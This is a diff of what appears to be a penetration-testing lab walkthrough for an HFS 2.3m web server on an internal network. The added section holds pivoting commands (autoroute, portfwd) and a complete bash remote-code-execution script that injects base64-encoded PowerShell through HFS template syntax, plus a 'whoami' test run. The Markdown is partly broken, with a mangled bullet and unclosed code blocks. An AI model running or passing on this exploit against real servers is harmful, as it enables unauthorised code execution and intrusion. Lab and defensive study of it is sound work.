@@ -213,30 +213,59 @@ Exploit vulnerable HFS 2.3m server on web.prod.local
 
 ### 🛠️ Tools Used
 
-* `portfwd`
-* `Metasploit rejetto_hfs_exec`
-* `custom hfs_rce.sh` Bash exploit
+* `* `custom hfs_rce.sh` Bash exploit
 * `curl`, `python3 -m http.server`
 
 ### 🔎 Steps
 
-1. Forward internal port:
+1) Add internal route
 
-   ```bash
-   portfwd add -l 8888 -p 80 -r 10.2.X.X
-   curl -I http://127.0.0.1:8888
-   # Server: HFS 2.3m
-   ```
+run autoroute -s 10.2.22.0/24
+2) Port forward HFS to Kali
 
-2. Run Metasploit module:
+portfwd add -l 8888 -p 80 -r 10.2.22.193
+Verify:
 
-   ```bash
-   use exploit/windows/http/rejetto_hfs_exec
-   set RHOST 127.0.0.1
-   set RPORT 8888
-   set LHOST <KALI_EXTERNAL>
-   set LPORT 7777
-   run
+curl -I http://127.0.0.1:8888
+# Expect: Server: HFS 2.3m
+3) Create HFS RCE script
+
+cat > hfs_rce.sh << 'EOF'
+#!/usr/bin/env bash
+banner() {
+cat <<'B'
+  ______     _______   ____   ___ ____  _  _     ____  _____  __   ___ ____  
+ / ___\ \   / / ____| |___ \ / _ \___ \| || |   |___ \|___ / / /_ / _ \___ \ 
+| |    \ \ / /|  _|     __) | | | |__) | || |_    __) | |_ \| '_ \ (_) |__) |
+| |___  \ V / | |___   / __/| |_| / __/|__   _|  / __/ ___) | (_) \__, / __/ 
+ \____|  \_/  |_____| |_____|\___/_____|  |_|   |_____|____/ \___/  /_/_____|
+                                                                             
+__     __                _                      _____         _     
+\ \   / /__ _ __ _   _  | |    __ _ _____   _  |_   _|__  ___| |__  
+ \ \ / / _ \ '__| | | | | |   / _` |_  / | | |   | |/ _ \/ __| '_ \ 
+  \ V /  __/ |  | |_| | | |__| (_| |/ /| |_| |   | |  __/ (__| | | |
+   \_/ \___|_|   \__, | |_____\__,_/___|\__, |   |_|\___|\___|_| |_|
+                 |___/                  |___/                       
+                    @VeryLazyTech - Medium
+B
+}
+banner
+set -e
+commands=$(echo "echo [S]; $2; echo [S];" | iconv -t UTF-16LE | base64 -w 0)
+payload="/?n=%0A&cmd=cmd+/c+powershell+-enc+$commands&search=%25xxx%25url%25:%password%\\}\\{.exec|\\{.?cmd.\\}|timeout=15|out=abc.\\}\\{.?n.\\}\\{.?n.\\}RESULT:\\{.?n.\\}\\{.^abc.\\}====\\{.?n.\\}"
+url=$1$payload
+printf "[*] Sending payload…\n"
+response=$(curl -s -X GET "$url")
+result=$(echo "$response" | awk 'BEGIN {found=0} /\[S\]/ {if (found == 0) {found=1; next} else {exit}} found {print}')
+printf "[*] Output:\n%s\n" "$result"
+EOF
+
+chmod +x hfs_rce.sh
+Test RCE:
+
+./hfs_rce.sh http://127.0.0.1:8888 "whoami"
+
+
    ```
 
 3. Used custom exploit:
